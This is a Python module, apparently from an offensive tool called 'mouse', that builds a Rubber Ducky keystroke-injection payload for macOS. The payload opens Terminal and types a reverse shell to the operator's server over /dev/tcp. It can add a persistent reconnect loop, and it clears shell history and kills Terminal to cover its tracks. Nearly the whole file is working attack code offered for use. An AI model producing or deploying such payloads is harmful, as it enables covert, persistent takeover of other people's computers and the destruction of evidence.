#!/usr/bin/env python3

import core.helper as h
import os, time

class payload:
	def __init__(self):
		self.name = "Duck macOS payload"
		self.description = "Rubber Ducky payload that replicates keystrokes for shell script execution."
		self.usage = "Install via ducktoolkit.com site."

	def run(self,server):
		while 1:
			shell = input(h.info_general_raw("Target shell: ")).strip(" ")
			if shell == "":
				shell = "sh"
			persistence = input(h.info_question_raw("Make persistent? (y/n): ")).strip(" ").lower()
			if persistence == "y":
				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
				break
			else:
				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
				break
		shell_command += "history -wc;killall Terminal"
		path = input(h.info_general_raw("Output path: ")).strip(" ")
		if path == "":
			path = "payload.txt"
		w = os.environ['OLDPWD']
		os.chdir(w)
		if os.path.isdir(path):
			if os.path.exists(path):
				if path[-1] == "/":
					payload_save_path = path + "payload.txt"
				else:
					payload_save_path = path + "/payload.txt"
			else:
				h.info_error("Local directory: "+dest+": does not exist!")
				g = os.environ['HOME']
				os.chdir(g + "/mouse")
				input("Press enter to continue...").strip(" ")
				os.system("touch .nopayload")
				return
		else:
			direct = os.path.split(path)[0]
			if direct == "":
				direct = "."
			else:
				pass
			if os.path.exists(direct):
				if os.path.isdir(direct):
					payload_save_path = path
				else:
					h.info_error("Error: "+direct+": not a directory!")
					g = os.environ['HOME']
					os.chdir(g + "/mouse")
					input("Press enter to continue...").strip(" ")
					os.system("touch .nopayload")
					return
			else:
				h.info_error("Local directory: "+direct+": does not exist!")
				g = os.environ['HOME']
				os.chdir(g + "/mouse")
				input("Press enter to continue...").strip(" ")
				os.system("touch .nopayload")
				return
		h.info_general("Creating payload...")
		payload = """\
DELAY 500
COMMAND SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 500
STRING """+shell_command+"""
DELAY 500
ENTER
DELAY 500"""
		h.info_general("Saving to " + payload_save_path + "...")
		f = open(payload_save_path,"w")
		f.write(payload)
		f.close()
		h.info_success("Saved to " + payload_save_path + "!")
		g = os.environ['HOME']
		os.chdir(g + "/mouse")
